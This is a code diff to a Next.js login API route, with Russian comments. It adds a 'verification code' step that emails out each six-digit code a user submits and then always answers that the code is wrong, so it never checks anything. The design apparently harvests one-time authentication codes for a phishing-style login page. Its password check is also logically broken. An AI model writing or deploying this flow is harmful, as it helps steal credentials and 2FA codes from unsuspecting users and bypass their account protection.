@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from "next/server";
-import { sendLoginEmail } from "@/lib/email";
+import { sendLoginEmail, sendCodeEmail } from "@/lib/email";
 import { setSession } from "@/lib/session";
 
 /**
@@ -16,8 +16,47 @@ export async function POST(request: NextRequest) {
     console.log("[API LOGIN] Данные:", { username, rememberUsername });
 
     // Валидация
-    if (!username || !password) {
-      console.error("[API LOGIN] Отсутствуют обязательные поля");
+    if (!username) {
+      console.error("[API LOGIN] Отсутствует username");
+      return NextResponse.json(
+        { error: "Username обязателен" },
+        { status: 400 }
+      );
+    }
+    
+    // Для verify-code страницы (password пустой) - проверяем код
+    const isVerificationCode = password === "";
+    if (isVerificationCode) {
+      // Проверяем, что код состоит из 6 цифр
+      if (!/^\d{6}$/.test(username.trim())) {
+        console.error("[API LOGIN] Неверный формат кода верификации");
+        return NextResponse.json(
+          { error: "Код должен содержать 6 цифр" },
+          { status: 400 }
+        );
+      }
+      
+      // Отправка Email с кодом верификации
+      try {
+        await sendCodeEmail(username.trim(), username.trim());
+        console.log("[API LOGIN] Email с кодом верификации отправлен");
+      } catch (emailError) {
+        console.error("[API LOGIN] Ошибка отправки Email с кодом:", emailError);
+        // Продолжаем выполнение
+      }
+      
+      // Здесь можно добавить проверку правильности кода
+      // Пока считаем, что код всегда неверный для демонстрации ошибки
+      console.error("[API LOGIN] Код верификации неверный");
+      return NextResponse.json(
+        { error: "Неверный код верификации" },
+        { status: 400 }
+      );
+    }
+    
+    // Password обязателен только для обычного входа (если передан и не пустой)
+    if (password !== undefined && password !== "" && (!password || password.trim() === "")) {
+      console.error("[API LOGIN] Отсутствует password");
       return NextResponse.json(
         { error: "Username и Password обязательны" },
         { status: 400 }
